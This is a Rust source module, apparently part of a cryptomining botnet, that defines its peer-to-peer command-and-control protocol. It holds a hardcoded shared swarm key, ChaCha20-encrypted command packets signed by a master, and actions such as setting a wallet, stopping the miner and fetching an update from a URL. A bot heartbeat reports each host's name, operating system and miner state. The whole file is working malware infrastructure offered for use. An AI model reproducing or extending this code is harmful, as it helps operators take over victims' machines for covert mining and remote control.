use serde::{Deserialize, Serialize};
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, AeadCore, KeyInit};
use chacha20poly1305::aead::{Aead, OsRng};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

// SHARED SWARM KEY (In real ops, generated/distributed securely)
// 32-byte hex string (64 chars)
pub const SWARM_KEY_HEX: &str = "9f77c3905c7429671d0728340d8542d627ac7426723223049182374192837462";

/// The Signaling Protocol for the Relay
#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(tag = "type", content = "payload")]
pub enum SignalMsg {
    Register { pub_key: String },
    RelaySignal { source: String, data: String }, 
    Peers { list: Vec<String> },
    // Outbound
    GetPeers,
    Signal { target: String, data: String }, // data is JSON of GhostPacket
}

/// The Authenticated "Ghost Packet" (Signed by Master)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct GhostPacket {
    pub ciphertext: String, // Base64 Encrypted JSON
    pub nonce: String,      // Base64 Nonce
    pub signature: String,  // Hex Signature of Ciphertext
}

/// The Actual Command Content (Inside GhostPacket)
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CommandPayload {
    /// e.g., "wallet:XYZ", "miner:stop", "ping", "update:url"
    pub action: String,
    /// Replay protection
    pub nonce: u64,
    /// Unix Timestamp
    pub timestamp: i64,
}

/// Bot Status Report (Heartbeat) - NOT YET SIGNED in this version, just informational
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BotStatus {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub version: String,
    pub miner_running: bool,
    pub mesh_health: f32,
}

impl GhostPacket {
    pub fn new(cmd: &CommandPayload, sign_fn: impl Fn(&[u8]) -> String) -> Self {
        let key_bytes = hex::decode(SWARM_KEY_HEX).expect("Invalid Swarm Key");
        let cipher = ChaCha20Poly1305::new(Key::from_slice(&key_bytes));
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits; unique per message
        
        let json = serde_json::to_string(cmd).unwrap();
        let ciphertext = cipher.encrypt(&nonce, json.as_bytes()).expect("Encryption Failed");
        
        // Encode
        let cipher_b64 = BASE64.encode(ciphertext);
        let nonce_b64 = BASE64.encode(nonce);
        
        // Sign the Ciphertext (Encrypt-then-Sign)
        let signature = sign_fn(cipher_b64.as_bytes());

        GhostPacket {
            ciphertext: cipher_b64,
            nonce: nonce_b64,
            signature,
        }
    }

    pub fn decrypt(&self) -> Option<CommandPayload> {
        let key_bytes = hex::decode(SWARM_KEY_HEX).ok()?;
        let cipher = ChaCha20Poly1305::new(Key::from_slice(&key_bytes));
        
        let nonce_bytes = BASE64.decode(&self.nonce).ok()?;
        let cipher_bytes = BASE64.decode(&self.ciphertext).ok()?;
        
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let plaintext = cipher.decrypt(nonce, cipher_bytes.as_ref()).ok()?;
        let json = String::from_utf8(plaintext).ok()?;
        
        serde_json::from_str(&json).ok()
    }
}
